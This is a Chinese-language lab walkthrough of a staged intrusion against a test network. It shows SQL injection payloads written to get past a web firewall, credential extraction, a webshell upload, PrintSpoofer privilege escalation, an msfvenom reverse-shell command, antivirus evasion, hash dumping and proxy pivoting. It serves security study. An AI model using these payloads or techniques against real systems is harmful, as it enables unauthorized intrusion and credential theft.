<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h2 data-content="1" id="756b049af76108012c9d821277cfee04">环境配置</h2>
<p>本机ip:192.168.2.161</p>
<p><strong>web</strong></p>
<p>自带iis安全狗、服务器安全狗、windows defender</p>
<p>外网ip:192.168.2.114(桥接)</p>
<p>内网ip:10.10.1.131(VMnet18)</p>
<p><strong>oa</strong></p>
<p>自带360全家桶</p>
<p>内网ip1:10.10.1.130(VMnet18)</p>
<p>内网ip2:10.10.10.166(VMnet19)</p>
<p><strong>dc</strong></p>
<p>内网ip:10.10.10.165(VMnet19)</p>
<p>web机器和本机不能够ping通，但是本机能够访问web机器服务，因为防火墙原因阻断，这里为正常情况</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150305-eb74906c-49fb-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150306-ebe4d3a4-49fb-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150307-ec6d1304-49fb-1.jpg"/></p>
<p>oa系统处能ping通dc，ping不通web，同样为防火墙阻断，正常情况</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150307-ece24426-49fb-1.jpg"/></p>
<p>从web机器访问一下oa系统可以访问</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150308-ed88f1a4-49fb-1.jpg"/></p>
<h2 data-content="1" id="6bc1d3f2fa76791747896955b1938992">外网打点</h2>
<h3 data-content="1" id="c2f79ec9311f7c257edba44ba60c4e8f">masscan namp扫描带防火墙的主机</h3>
<p>用arp探测工具<code>netdiscover</code>先扫描192.168.2.0段</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150311-eedebfd4-49fb-1.jpg"/></p>
<pre><code>masscan -p 1-65535 192.168.2.114 –-rate=100 //--rate参数为线程</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150312-ef7ca8f2-49fb-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150313-f08344c2-49fb-1.jpg"/></p>
<p>进行host域名绑定</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150315-f185dee8-49fb-1.jpg"/></p>
<p>访问后传参进去可以看到有安全狗</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150316-f20053d0-49fb-1.jpg"/></p>
<p>nmap对对应端口进行扫描</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150318-f2f366e2-49fb-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150319-f41dc1a2-49fb-1.jpg"/></p>
<h3 data-content="1" id="52ddc0d3bdfade4c441b73c84d34d75b">编写目录扫描工具绕过防火墙CC拦截</h3>
<p>看下web机器上的安全狗的防护日志</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150321-f525a42a-49fb-1.jpg"/></p>
<p>打开护卫神的web防火墙（抗CC）功能</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150322-f5baaea8-49fb-1.jpg"/></p>
<p>我这里用御剑去扫描后台发现扫描不到</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150324-f6db5b66-49fb-1.jpg"/></p>
<p>回到web容器上发现已经被拦截</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150325-f78836d8-49fb-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150326-f7fd0f4e-49fb-1.jpg"/></p>
<p>编写<code>dir_safedog.py</code>脚本</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150327-f8c0fc6a-49fb-1.jpg"/></p>
<p>完整代码如下：</p>
<div class="highlight"><pre><span></span><span class="c1">#conding:utf-8</span>



<span class="kn">import</span> <span class="nn">requests</span>

<span class="kn">import</span> <span class="nn">time</span>

<span class="kn">import</span> <span class="nn">sys</span>



<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'word.txt'</span><span class="p">,</span><span class="s1">'r'</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">readfile</span><span class="p">:</span>

    <span class="k">for</span> <span class="n">dirs</span> <span class="ow">in</span> <span class="n">readfile</span><span class="o">.</span><span class="n">readlines</span><span class="p">():</span>

       <span class="n">url</span> <span class="o">=</span> <span class="s1">'http://www.moonlab.com'</span> <span class="o">+</span> <span class="n">dirs</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>

       <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>

       <span class="n">strlen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

       <span class="k">print</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">'---'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'---len---'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">strlen</span><span class="p">))</span>

       <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>



       <span class="k">if</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span> <span class="ow">or</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">403</span> <span class="ow">or</span> <span class="n">resp</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">500</span><span class="p">:</span>

           <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">'write.txt'</span><span class="p">,</span><span class="s1">'a'</span><span class="p">,</span><span class="n">encoding</span><span class="o">=</span><span class="s1">'utf-8'</span><span class="p">)</span> <span class="k">as</span> <span class="n">writefile</span><span class="p">:</span>

              <span class="n">writefile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">url</span> <span class="o">+</span> <span class="s1">'---'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'---len---'</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">strlen</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">)</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150329-f9dff95c-49fb-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150330-fa949150-49fb-1.jpg"/></p>
<p>找到登录入口</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150331-fb065d62-49fb-1.jpg"/></p>
<h3 data-content="1" id="70dedfdaac2443dc0ad7293ff5969fd2">修改siteserver poc得到注入点</h3>
<p>寻找对应版本的exp</p>
<p><a href="https://github.com/w-digital-scanner/w9scan/tree/master/plugins/siteserver" target="_blank">https://github.com/w-digital-scanner/w9scan/tree/master/plugins/siteserver</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150332-fb7982e2-49fb-1.jpg"/></p>
<p>这里对应版本为<code>2739.py</code></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150333-fc5088dc-49fb-1.jpg"/></p>
<p>对原始代码进行修改</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150335-fd17af7a-49fb-1.jpg"/></p>
<p>运行<code>siteserver.py</code>，得到如下payload可以利用</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150335-fdab271e-49fb-1.jpg"/></p>
<p>复制payload得出数据库版本</p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span><span class="o">%</span><span class="mi">20</span><span class="nb">char</span><span class="p">(</span><span class="mi">71</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">Bchar</span><span class="p">(</span><span class="mi">65</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">Bchar</span><span class="p">(</span><span class="mi">79</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">Bchar</span><span class="p">(</span><span class="mi">74</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">Bchar</span><span class="p">(</span><span class="mi">73</span><span class="p">)</span><span class="o">%</span><span class="mi">2</span><span class="n">B</span><span class="o">@@</span><span class="k">version</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150336-fe177586-49fb-1.jpg"/></p>
<h3 data-content="1" id="3e0946f4faac70df4defa22e0e18308e">绕过iis安全狗进行注入</h3>
<p>直接报数据库名拦截</p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span><span class="o">%</span><span class="mi">20</span><span class="n">db_name</span><span class="p">()</span><span class="o">=</span><span class="mi">2</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150338-fef6d60e-49fb-1.jpg"/></p>
<pre><code>这里用到C语言的一个~符号，按位取反



按位取反“~”：按位取反1变0，0变1



~按位取反



5二进制00000101，取反11111010，代表-6</code></pre>
<p>使用按位取反即可绕过</p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span><span class="o">%</span><span class="mi">20</span><span class="n">db_name</span><span class="p">()</span><span class="o">=~</span><span class="mi">2</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150339-ff9724c4-49fb-1.jpg"/></p>
<p>本地搭建siteserver并连接sql server数据库</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150341-0129f6c2-49fc-1.jpg"/></p>
<p>找到Administrator选择显示前1000行</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150344-02a61d96-49fc-1.jpg"/></p>
<p>这里的sql语句应该为</p>
<div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="n">TOP</span> <span class="mi">1000</span> <span class="p">[</span><span class="n">UserName</span><span class="p">],[</span><span class="n">Password</span><span class="p">],[</span><span class="n">PasswordFormat</span><span class="p">],[</span><span class="n">PasswordSalt</span><span class="p">],[</span><span class="n">CreationDate</span><span class="p">],[</span><span class="n">LastActivityDate</span><span class="p">],[</span><span class="n">LastModuleID</span><span class="p">],[</span><span class="n">CountOfLogin</span><span class="p">],[</span><span class="n">CreatorUserName</span><span class="p">],[</span><span class="n">IsChecked</span><span class="p">],[</span><span class="n">IsLockedOut</span><span class="p">],[</span><span class="n">PublishmentSystemID</span><span class="p">],[</span><span class="n">DepartmentID</span><span class="p">],[</span><span class="n">AreaID</span><span class="p">],[</span><span class="n">DisplayName</span><span class="p">],[</span><span class="n">Question</span><span class="p">],[</span><span class="n">Answer</span><span class="p">],[</span><span class="n">Email</span><span class="p">],[</span><span class="n">Mobile</span><span class="p">],[</span><span class="n">Theme</span><span class="p">],[</span><span class="k">Language</span><span class="p">]</span> <span class="k">FROM</span> <span class="n">bairong_Administrator</span><span class="p">;</span>
</pre></div>
<p>直接使用sql语句被拦截</p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span><span class="o">%</span><span class="mi">20</span><span class="n">db_name</span><span class="p">(</span><span class="k">select</span><span class="o">%</span><span class="mi">20</span><span class="n">top</span><span class="o">%</span><span class="mi">201</span><span class="o">%</span><span class="mi">20</span><span class="n">username</span><span class="o">%</span><span class="mi">20</span><span class="k">from</span><span class="o">%</span><span class="mi">20</span><span class="n">bairong_Administrator</span><span class="p">)</span><span class="o">=~</span><span class="mi">2</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150345-0312a48e-49fc-1.jpg"/></p>
<p>这里加上中括号也被拦截</p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">username</span> <span class="k">from</span> <span class="p">[</span><span class="n">bairong_Administrator</span><span class="p">])</span><span class="o">=~</span><span class="mi">1</span><span class="p">;</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150345-03790a6c-49fc-1.jpg"/></p>
<p>把~1换位不拦截出现username：<code>admin</code></p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span> <span class="o">~</span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">username</span> <span class="k">from</span> <span class="p">[</span><span class="n">bairong_Administrator</span><span class="p">]);</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150346-03eb27d2-49fc-1.jpg"/></p>
<p>爆password：<code>64Cic1ERUP9n2OzxuKl9Tw==</code></p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span> <span class="o">~</span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">password</span> <span class="k">from</span> <span class="p">[</span><span class="n">bairong_Administrator</span><span class="p">]);</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150348-04e4fcb2-49fc-1.jpg"/></p>
<p>爆加密类型：<code>Encrypted</code></p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span> <span class="o">~</span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">PasswordFormat</span> <span class="k">from</span> <span class="p">[</span><span class="n">bairong_Administrator</span><span class="p">]);</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150348-05654304-49fc-1.jpg"/></p>
<p>爆盐值：<code>LIywB/zHFDTuEA1LU53Opg==</code></p>
<div class="highlight"><pre><span></span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">moonlab</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">usercenter</span><span class="o">/</span><span class="n">platform</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">aspx</span><span class="o">?</span><span class="n">UnLock</span><span class="o">=</span><span class="n">sdfe</span><span class="o">%</span><span class="mi">27</span><span class="o">&amp;</span><span class="n">UserNameCollection</span><span class="o">=</span><span class="n">test</span><span class="o">%</span><span class="mi">27</span><span class="p">)</span><span class="o">%</span><span class="mi">20</span><span class="k">and</span> <span class="o">~</span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span> <span class="n">top</span> <span class="mi">1</span> <span class="n">PasswordSalt</span> <span class="k">from</span> <span class="p">[</span><span class="n">bairong_Administrator</span><span class="p">]);</span><span class="o">%</span><span class="mi">20</span><span class="c1">--</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150349-05d37a54-49fc-1.jpg"/></p>
<h3 data-content="1" id="1fe0b2857e08477dba3a89abe5f21eaf">密码找回漏洞和网站后台getshell</h3>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150350-064b77b6-49fc-1.jpg"/></p>
<p>用户名为admin</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150351-06c76b82-49fc-1.jpg"/></p>
<p>密保问题处抓包并置空</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150352-075385b8-49fc-1.jpg"/></p>
<p>Forward把包放过去即可得到密码</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150600-53abb8b8-49fc-1.jpg"/></p>
<p>登入后台到站点模板管理</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150601-54480948-49fc-1.jpg"/></p>
<p>先上一个收藏的asp大马，然后被拦了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150601-54a4c23c-49fc-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150603-55c9dc2e-49fc-1.jpg"/></p>
<p>然后上了一个过墙马，过是过了但是没有回显，马还在返回不到数据</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150604-5672d05e-49fc-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150605-5711f170-49fc-1.jpg"/></p>
<p>最终拿的冰蝎aspx大马成功getshell</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150606-577dcd82-49fc-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150607-57fc2470-49fc-1.jpg"/></p>
<h2 data-content="1" id="976cdc2a217d94cfd6f1c7e68ac54a09">内网渗透</h2>
<h3 data-content="1" id="96d13fc8884e393d008151bbaa49633c">Windows Server2016提权</h3>
<p>首先进行信息搜集</p>
<p>双网卡user权限</p>
<p>防护：安全狗、IIS安全狗、windows defender</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150608-58a027f0-49fc-1.jpg"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150609-5952a6aa-49fc-1.jpg"/></p>
<p>利用<code>PrintSpoofer</code>提权</p>
<p><a href="https://github.com/itm4n/PrintSpoofer" target="_blank">https://github.com/itm4n/PrintSpoofer</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150610-59d9b910-49fc-1.jpg"/></p>
<div class="highlight"><pre><span></span><span class="n">PrintSpoofer64</span><span class="p">.</span><span class="n">exe</span> <span class="n">-i</span> <span class="n">-c</span> <span class="s2">"whoami"</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150611-5a46848c-49fc-1.jpg"/></p>
<h3 data-content="1" id="6d7802433e8d5d9bf0f8ac4917267817">msf shellcode 绕过windows defender</h3>
<p>msf生成payload</p>
<div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">-</span><span class="n">p</span> <span class="n">windows</span><span class="o">/</span><span class="n">x64</span><span class="o">/</span><span class="n">meterpreter</span><span class="o">/</span><span class="n">reverse_tcp</span> <span class="n">LHOST</span><span class="o">=</span><span class="mf">192.168.2.161</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">2333</span> <span class="o">-</span><span class="n">e</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span> <span class="o">-</span><span class="n">i</span> <span class="mi">15</span> <span class="o">-</span><span class="n">f</span> <span class="n">csharp</span> <span class="o">-</span><span class="n">o</span> <span class="n">payload</span><span class="p">.</span><span class="n">txt</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150612-5accdc94-49fc-1.jpg"/></p>
<p>掩日shellcode加密下载：</p>
<p><a href="https://github.com/1y0n/AV_Evasion_Tool/releases/tag/2.1" target="_blank">https://github.com/1y0n/AV_Evasion_Tool/releases/tag/2.1</a></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150613-5bd51db8-49fc-1.jpg"/></p>
<p>​</p>
<p>免杀处理之后上360发现已经不免杀了</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150614-5c649628-49fc-1.png"/></p>
<p>这里换了一个cs的免杀马成功上线到cs</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150615-5cfbb67a-49fc-1.png"/></p>
<p>新建一个监听派生给msf</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150620-6003e28e-49fc-1.png"/></p>
<h3 data-content="1" id="47f39e0751b4cb4b10730cedeac0ceb1">hashcat破解web服务器hash</h3>
<p><code>getuid</code>和<code>sysinfo</code>看一下基本情况</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150621-608e9c9e-49fc-1.png"/></p>
<p>这里看到meterpreter为x86，需要进行进程迁移，ps看一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150626-637355ee-49fc-1.png"/></p>
<p>我这里迁移到一个x64的系统进程里</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150627-63faf350-49fc-1.png"/></p>
<p><code>hashdump</code>抓一下hash</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150632-66ea8724-49fc-1.png"/></p>
<p><code>load mimikatz</code>，这里之前msf5的时候还有<code>kerberos</code>这个命令，现在变了，help看一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150641-6c83277c-49fc-1.png"/></p>
<p><code>hashcat</code>配合<code>rockyou.txt</code>字典破解hash</p>
<p><code>rockyou.txt</code>下载地址：<a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" target="_blank">https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt</a></p>
<pre><code>hashcat -a 0 -m 1000 hash.txt rockyou.txt</code></pre>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150645-6e86de2e-49fc-1.png"/></p>
<p>这里我操作的问题没有弄出来，后面有机会具体学习下hashcat的用法</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150646-6f27cf0a-49fc-1.png"/></p>
<h3 data-content="1" id="03d6476394378d8639a19d49cf5712ea">跨网段横向渗透</h3>
<p>拿到抓到的hash登录远程桌面</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150647-6fa8e414-49fc-1.png"/></p>
<p>手动关掉windows defender</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150659-770c43ae-49fc-1.png"/></p>
<p>进行本机信息搜集</p>
<p>msf下<code>ifconfig</code>发现为双网卡</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150701-780f6330-49fc-1.png"/></p>
<p><code>arp</code>查看arp缓存</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150705-7a7eddc6-49fc-1.png"/></p>
<p>利用<code>icmp</code>协议探测内网存活主机</p>
<pre><code>for /l %i in (1,1,255) do @ ping 10.1.1.%i -w 1 -n 1 | find /i "ttl="</code></pre>
<p>这里不知道为什么没有探测到，换一个协议探测一下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150706-7b1bd810-49fc-1.png"/></p>
<p>利用arp协议进行扫描</p>
<pre><code>run arp_scanner -r 10.10.1.0/24</code></pre>
<h3 data-content="1" id="90c9ca14769f5c7acb4e2648b5769e84">跨网段主机端口扫描</h3>
<p>使用socks4a模块</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150707-7bcce308-49fc-1.png"/></p>
<p>配置proxychains.conf</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150708-7c4a4208-49fc-1.png"/></p>
<p>添加10.10.1.0/24的路由</p>
<div class="highlight"><pre><span></span><span class="n">run</span> <span class="n">autoroute</span> <span class="o">-</span><span class="n">s</span> <span class="mf">10.10.1.0</span><span class="o">/</span><span class="mi">24</span>    <span class="n">run</span> <span class="n">autoroute</span> <span class="o">-</span><span class="n">p</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150709-7d37c186-49fc-1.png"/></p>
<p>用proxychain扫描一下10.10.1.0段主机的80端口</p>
<div class="highlight"><pre><span></span><span class="n">proxychains</span> <span class="n">nmap</span> <span class="o">-</span><span class="n">sT</span> <span class="o">-</span><span class="n">Pn</span> <span class="mf">10.10.1.130</span> <span class="o">-</span><span class="n">p</span> <span class="mi">80</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150714-7fbf8b0a-49fc-1.png"/></p>
<p>用firefox访问80端口</p>
<div class="highlight"><pre><span></span><span class="n">proxychains</span> <span class="n">firefox</span> <span class="nl">http</span><span class="p">:</span><span class="c1">//10.10.1.130</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20221012150733-8b0ee2f8-49fc-1.png"/></p>
<p>proxychains配合nmap对常用端口进行扫描</p>
